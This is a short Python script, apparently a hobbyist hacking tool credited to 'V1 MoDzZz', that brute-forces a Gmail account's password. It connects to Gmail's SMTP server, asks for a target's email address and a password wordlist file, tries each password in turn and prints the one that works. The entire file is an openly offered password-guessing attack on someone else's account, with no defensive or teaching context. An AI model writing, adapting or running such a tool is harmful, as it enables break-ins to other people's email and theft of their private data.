import smtplib


print('''

 ####### ######   #####   #####  
    #    #     # #     # #     # 
    #    #     #       #       # 
    #    ######   #####   #####  
    #    #   #         #       # 
    #    #    #  #     # #     # 
    #    #     #  #####   #####  
                                 

''')

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

print("connection successful")

print("made by V1 MoDzZz")

user = input("Enter the targets email address: ")

pwfile = input("what is your password file directory: ")
pwfile = open(pwfile, "r")


for password in pwfile:
    try:
        smtpserver.login(user, password)
        print("so the password is ", password)
        break;
        
    except smtplib.SMTPAuthenticationError:
        print(password, "is not the password")

